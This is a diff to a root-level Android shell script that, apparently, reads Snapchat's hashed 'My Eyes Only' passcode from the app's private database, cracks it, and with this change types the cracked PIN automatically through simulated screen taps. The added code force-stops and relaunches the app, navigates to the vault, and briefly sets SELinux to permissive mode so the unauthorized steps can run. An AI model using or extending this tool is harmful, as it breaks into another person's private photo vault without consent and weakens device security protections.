@@ -421,6 +421,54 @@ if su -c "ls -l '/data/data/com.snapchat.android/sqlite'" >/dev/null 2>&1; then
   echo "$running SQLite --version → v$SQLiteVersion"
 fi
 
+# --- Automatically try Cracked MEO PassCode ---
+tryMEO() {
+  su -c "am force-stop com.snapchat.android"  # Force stop SnapChat
+  sleep 0.5  # Wait for 500 milliseconds
+  su -c "monkey -p com.snapchat.android -c android.intent.category.LAUNCHER 1 > /dev/null 2>&1"  # Open SnapChat app
+  sleep 10  # wait 10 seconds
+  #su -c "input tap 0 1789 110 1940"  # tap on Memories @AndroidSDK/uiautomator
+  su -c "input tap 318 1855"  # Tap on Memories @Settings/System/DeveloperOptions/PointerLocation (SnapChat/Memories > X:318, Y:1855)
+  sleep 2  # Wait 2 seconds
+  su -c "input touchscreen swipe 540 406 44 406 200"  # swipe the horizontal scroll bar
+  sleep 2  # wait 2 seconds
+  su -c "input tap 714 406 992 481"  # tap on 'My Eyes Only'
+  
+  # Define the input tap coordinates for each key
+  declare -A MyEyesOnlyKey=(
+      ['1']="su -c 'input tap 171 995 369 1193'"  # MyEyesOnly Key 1
+      ['2']="su -c 'input tap 441 995 639 1193'"  # MyEyesOnly Key 2
+      ['3']="su -c 'input tap 711 995 909 1193'"  # MyEyesOnly Key 3
+      ['4']="su -c 'input tap 171 1259 369 1457'"  # MyEyesOnly Key 4
+      ['5']="su -c 'input tap 441 1259 639 1457'"  # MyEyesOnly Key 5
+      ['6']="su -c 'input tap 711 1259 909 1457'"  # MyEyesOnly Key 6
+      ['7']="su -c 'input tap 171 1523 369 1721'"  # MyEyesOnly Key 7
+      ['8']="su -c 'input tap 441 1523 639 1721'"  # MyEyesOnly Key 8
+      ['9']="su -c 'input tap 711 1523 909 1721'"  # MyEyesOnly Key 9
+      ['0']="su -c 'input tap 441 1787 639 1985'"  # MyEyesOnly Key 0
+  )
+  
+  sleep 0.5  # Wait 500 milliseconds
+  # Check if PinCode is valid
+  if [ -n "$pincode" ]; then
+    echo "$running Trying Cracked My Eyes Only PinCode: $pincode"
+    # Loop through each digit in the PinCode
+    for (( i=0; i<${#pincode}; i++ )); do
+        digit=${pincode:$i:1}
+        if [[ -v MyEyesOnlyKey["$digit"] ]]; then
+            command=${MyEyesOnlyKey["$digit"]}
+            # echo "Executing tap for digit $digit : $command"
+            eval "$command"
+            sleep 0.5
+        else
+            echo "$notice Invalid digit: $digit"
+        fi
+    done
+  else
+    echo "$bad Failed to extract PinCode."
+  fi
+}
+
 # --- Get the hashed PassCode ---
 if su -c "ls -l /data/data/com.snapchat.android/databases/memories.db" >/dev/null 2>&1; then
   hashed_passcode=$(su -c "/data/data/com.snapchat.android/sqlite /data/data/com.snapchat.android/databases/memories.db 'select hashed_passcode from memories_meo_confidential;'")
@@ -458,9 +506,15 @@ if su -c "ls -l /data/data/com.snapchat.android/databases/memories.db" >/dev/nul
   # --- Validate and display result ---
   if [ ${#pincode} -eq 4 ]; then
     echo "\033[1;92;47m[****] Cracked My Eyes Only PinCode: [$pincode]\033[0m"
-    echo "$info Please Open SnapChat app and try cracked 'My Eyes Only' PinCode: $pincode"
-    su -c "monkey -p com.snapchat.android -c android.intent.category.LAUNCHER 1 > /dev/null 2>&1"
-
+    
+    if [ "$(su -c 'getenforce 2>/dev/null')" = "Enforcing" ]; then
+      su -c "setenforce 0"  # set SELinux to Permissive mode to unblock unauthorized operations
+      tryMEO  # Call the auto try MEO PassCode function
+      su -c "setenforce 1"  # set SELinux to Enforcing mode to block unauthorized operations
+    else
+      tryMEO
+    fi
+    
     echo "${Green}☆ Star & -{ Fork me..${Reset}"
     # Open GitHub URL
     termux-open-url "https://github.com/arghya339/IntelliJ-MyEyes"
